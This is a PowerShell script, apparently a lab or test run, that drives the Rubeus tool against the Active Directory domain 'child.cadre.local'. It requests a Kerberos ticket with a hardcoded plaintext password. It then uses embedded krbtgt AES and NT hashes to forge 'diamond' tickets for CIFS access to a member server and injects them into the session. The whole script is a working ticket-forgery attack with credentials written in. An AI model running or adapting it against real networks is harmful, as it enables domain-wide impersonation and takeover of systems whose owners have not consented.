# WT012 v5: asktgt /ptt then diamond /tgtdeleg
$ErrorActionPreference = 'Continue'
$rb = 'C:\Tools\ADTools\Rubeus-try4.exe'
$out = 'C:\Tools\ADTools'
$krbtgtAes = 'd64da42f8e5caeeb725d009b615eb98f4f05b121376ca38c1e1ee9dcb553d9d2'
$krbtgtNt = 'b6c370f260f2ec4a9eabaedf34882ec1'
$dc = 'dc02.child.cadre.local'

klist purge 2>&1 | Out-Null

# 1. Get + PTT a legit TGT into this session
Write-Output '=== asktgt /ptt ==='
& $rb asktgt /user:analyst_t1 /password:T13r_An@lyst! /domain:child.cadre.local "/dc:$dc" /ptt 2>&1 | Select-String -Pattern 'successfully imported|ServiceName|KRB|error' | Select-Object -First 5 | ForEach-Object { Write-Output "TGT|$_" }

# 2. diamond /tgtdeleg (AES then RC4)
foreach ($et in @('aes','rc4')) {
    Write-Output "=== DIAMOND /tgtdeleg /enctype:$et ==="
    $k = if ($et -eq 'aes') { $krbtgtAes } else { $krbtgtNt }
    & $rb diamond /tgtdeleg "/krbtgt:$k" "/enctype:$et" /service:cifs/mbr01.child.cadre.local "/dc:$dc" /ptt 2>&1 | Select-String -Pattern 'Action|TGT request|Unable|decrypt|PAC|successfully imported|ServiceName|cifs|KRB|error|X ' | Select-Object -First 15 | ForEach-Object { Write-Output "DIAM|$_" }
}

Write-Output '=== klist check ==='
klist 2>&1 | Select-String -Pattern 'cifs|mbr01' | Select-Object -First 4 | ForEach-Object { Write-Output "KERB|$_" }

klist purge 2>&1 | Out-Null
Write-Output 'WT012_V5_DONE'
